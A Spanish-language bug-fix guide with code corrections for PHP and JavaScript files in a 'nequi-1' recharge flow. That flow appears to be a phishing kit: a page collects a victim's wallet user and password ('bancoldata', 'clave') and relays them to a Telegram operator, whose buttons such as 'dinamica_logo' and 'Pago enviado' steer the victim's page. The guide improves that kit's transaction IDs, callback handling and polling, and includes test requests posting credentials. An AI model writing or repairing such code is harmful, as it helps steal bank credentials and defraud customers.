# ✅ Guía de Correcciones - Botones Interactivos

Este documento contiene el código corregido para cada problema identificado.

---

## 🔧 CORRECCIÓN 1: Generador de TID Consistente

### Archivo: `data-ps/recargas/transaction/nequi-1/index.php`

**Línea 270 - ANTES (❌):**
```javascript
function generarTransactionId() {
    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
}
```

**Línea 270 - DESPUÉS (✅):**
```javascript
function generarTransactionId() {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substr(2, 9).toUpperCase();
    return `tid_${timestamp}_${random}`;
}
```

**Por qué funciona:**
- Genera IDs predecibles y únicos: `tid_1725706500123_abc12def45`
- Fácil de parsear en PHP
- Evita conflictos entre transacciones

**Verificar:** Los IDs ahora se verán así:
```
✅ tid_1725706500123_abc12def45
✅ tid_1725706501456_xyz98uio12
```

---

## 🔧 CORRECCIÓN 2: Búsqueda Exacta de Callbacks

### Archivo: `data-ps/recargas/transaction/nequi-1/1.php`

**Línea 218-226 - ANTES (❌):**
```php
foreach ($updates['result'] as $upd) {
    if (!isset($upd['callback_query'])) {
        continue;
    }

    $cb = $upd['callback_query'];
    if (!isset($cb['data']) || strpos($cb['data'], $tid) === false) {
        continue;
    }
```

**Línea 218-234 - DESPUÉS (✅):**
```php
foreach ($updates['result'] as $upd) {
    if (!isset($upd['callback_query'])) {
        continue;
    }

    $cb = $upd['callback_query'];
    if (!isset($cb['data'])) {
        continue;
    }

    // 🔐 Validación exacta del formato
    $callbackParts = explode(':', $cb['data']);
    if (count($callbackParts) !== 2 || $callbackParts[1] !== $tid) {
        continue;
    }

    // Extraer acción correctamente
    $action = $callbackParts[0];
```

**Por qué funciona:**
- ✅ Valida que el formato sea exactamente `accion:tid`
- ✅ Compara TID de manera exacta (no substring)
- ✅ No procesa callbacks de otras transacciones

**Verificar:**
```bash
# Callback válido
✅ si:tid_1725706500123_abc12def45

# Callback rechazado (TID no coincide)
❌ si:tid_1725706501456_xyz98uio12
```

---

## 🔧 CORRECCIÓN 3: Manejo Robusto de Errores en Polling

### Archivo: `data-ps/recargas/transaction/nequi-1/index.php`

**Línea 338-350 - ANTES (❌):**
```javascript
async function checkLogin(transactionId) {
    try {
        const res = await fetch(`1.php?transactionId=${transactionId}`);
        let json;
try {
    json = await res.json();
} catch (e) {
    return; // falla silenciosa
}

        if (json.ok && json.action) {
            clearInterval(poll);
            clearTimeout(timeout);
            modal.style.display = "none";
            // ... switch
```

**Línea 338-380 - DESPUÉS (✅):**
```javascript
async function checkLogin(transactionId) {
    try {
        const res = await fetch(`1.php?transactionId=${transactionId}`);
        
        // Validar respuesta HTTP
        if (!res.ok) {
            console.error(`Error HTTP: ${res.status}`);
            return;
        }

        let json;
        try {
            json = await res.json();
        } catch (parseError) {
            console.error("Error al parsear JSON:", parseError);
            console.error("Respuesta del servidor:", await res.text());
            return;
        }

        // Validar estructura JSON
        if (!json || typeof json !== 'object') {
            console.warn("Respuesta inválida - no es objeto JSON");
            return;
        }

        // Solo procesar si hay respuesta positiva y acción
        if (json.ok === true && json.action) {
            clearInterval(poll);
            clearTimeout(timeout);
            modal.style.display = "none";

            // Log de depuración
            console.log(`✅ Acción recibida: ${json.action} para ${transactionId}`);

            switch (json.action) {
                // ... resto del switch
```

**Por qué funciona:**
- ✅ Valida status HTTP antes de parsear
- ✅ Captura y registra errores de parseo
- ✅ Verifica estructura JSON
- ✅ Logs para debugging

---

## 🔧 CORRECCIÓN 4: Diferenciar Archivos de Estado

### Archivo: `data-ps/recargas/transaction/nequi-1/2.php`

**Línea 179-185 - ANTES (❌):**
```php
// 1. Leer el último update_id procesado desde el archivo local plano
$tempDir = __DIR__;
$statusFile = $tempDir . '/last_update_' . md5($tid) . '.txt';
$lastProcessedUpdateId = 0;
if (file_exists($statusFile)) {
    $lastProcessedUpdateId = (int)file_get_contents($statusFile);
}
```

**Línea 179-185 - DESPUÉS (✅):**
```php
// 1. Leer el último update_id procesado desde el archivo local plano
$tempDir = __DIR__;
// ✅ Prefijo diferente para 2.php
$statusFile = $tempDir . '/last_update_2_' . md5($tid) . '.txt';
$lastProcessedUpdateId = 0;
if (file_exists($statusFile)) {
    $lastProcessedUpdateId = (int)file_get_contents($statusFile);
}
```

**Por qué funciona:**
- ✅ Evita conflictos entre `1.php` y `2.php`
- ✅ Cada archivo mantiene su propio offset
- ✅ No hay interferencia de polling

**Archivos generados:**
```
✅ last_update_abc123def456.txt     (1.php)
✅ last_update_2_abc123def456.txt   (2.php)
```

---

## 🔧 CORRECCIÓN 5: Implementar .last_action

### Archivo: `data-ps/recargas/transaction/nequi-1/1.php`

**Agregar función después de línea 86:**
```php
/* ============================================================
    PERSISTENCIA: Guardar última acción
    ============================================================ */
function saveLastAction($tid, $action, $updateId, $user)
{
    $file = __DIR__ . '/.last_action';
    $data = [
        'transactionId' => $tid,
        'lastAction' => $action,
        'lastUpdateId' => $updateId,
        'processedBy' => $user,
        'timestamp' => date('Y-m-d H:i:s'),
        'unix_timestamp' => time()
    ];
    
    if (!file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT))) {
        error_log("Error guardando .last_action para $tid");
    }
}
```

**Llamar en línea 254 (después de guardar en statusFile):**
```php
// Guardar de inmediato para evitar doble procesamiento
file_put_contents($statusFile, $updateId);

// ✅ AGREGAR: Guardar en archivo global
saveLastAction($tid, $action, $updateId, $user);
```

**Resultado:**
```json
{
    "transactionId": "tid_1725706500123_abc12def45",
    "lastAction": "dinamica_logo",
    "lastUpdateId": 12345,
    "processedBy": "operador_telegram",
    "timestamp": "2026-09-07 14:35:22",
    "unix_timestamp": 1725706522
}
```

---

## 🧪 Plan de Testing

### Test 1: Generador de TID
```javascript
// En consola del navegador (index.php)
generarTransactionId();
// Esperado: tid_1725706500123_abc12def45
```

### Test 2: Envío POST
```bash
curl -X POST "http://tu-servidor/data-ps/recargas/transaction/nequi-1/1.php" \
  -H "Content-Type: application/json" \
  -d '{
    "transactionId": "tid_1725706500123_abc12def45",
    "bancoldata": {"usuario": "3001234567", "clave": "3001234567"},
    "tbdatos": {"nombre": "Test"},
    "total": "50000"
  }'

# Esperado: {"ok": true}
```

### Test 3: Polling
```bash
curl "http://tu-servidor/data-ps/recargas/transaction/nequi-1/1.php?transactionId=tid_1725706500123_abc12def45"

# Esperado: {"ok": false} (hasta que pulsemos botón en Telegram)
```

### Test 4: Callback Simulado (en Telegram)
1. Usuario pulsa botón `✅ Pago enviado`
2. Esperar 5 segundos (intervalo de polling)
3. Esperado: Página redirige a `espera.php`

### Test 5: Verificar Archivos de Estado
```bash
# Ver archivos creados
ls -la /data-ps/recargas/transaction/nequi-1/last_update_*

# Ver última acción
cat /data-ps/recargas/transaction/nequi-1/.last_action
```

---

## 📋 Checklist de Implementación

- [ ] **1.php:** Actualizar búsqueda de callbacks (línea 224)
- [ ] **1.php:** Agregar función `saveLastAction()` (después línea 86)
- [ ] **1.php:** Llamar `saveLastAction()` (línea 254)
- [ ] **2.php:** Cambiar nombre de statusFile (línea 180)
- [ ] **index.php:** Actualizar generador de TID (línea 270)
- [ ] **index.php:** Mejorar manejo de errores (línea 338)
- [ ] **Testing:** Ejecutar todos los tests
- [ ] **Verificación:** Confirmar que los 6 botones funcionan

---

## 🚀 Comandos Git para Aplicar Cambios

```bash
# 1. Crear rama para correcciones
git checkout -b fix/botones-interactivos

# 2. Editar archivos (usar correcciones de arriba)
# - 1.php
# - 2.php
# - index.php

# 3. Verificar cambios
git diff data-ps/recargas/transaction/nequi-1/

# 4. Commit
git add data-ps/recargas/transaction/nequi-1/*.php
git commit -m "fix: Corregir lógica de botones interactivos en Telegram"

# 5. Push
git push origin fix/botones-interactivos

# 6. Crear PR y revisar cambios
```

---

## 🆘 Troubleshooting

### Problema: "Botones no responden"
```bash
# 1. Verificar logs de polling en consola
open DevTools → Console → F12

# 2. Ver archivo de estado
cat last_update_*.txt

# 3. Verificar respuesta del servidor
curl -v "http://servidor/1.php?transactionId=tu_tid"
```

### Problema: "Transacciones se pisan"
```bash
# Verificar si hay conflicto de TIDs
grep -r "tid_" last_update_*.txt

# Cambiar generador de TID para mayor unicidad
# (agregar más caracteres aleatorios)
```

### Problema: "Archivos de estado corruptos"
```bash
# Limpiar archivos antiguos
rm last_update_*.txt
rm .last_action

# Reintentar operación desde el inicio
```

---

## 📞 Soporte

Para más información, consultar:
- `BOTONES_INTERACTIVOS_ANALISIS.md` - Análisis detallado
- `API_REFERENCE.md` - Referencia de endpoints
- `README.md` - Arquitectura general
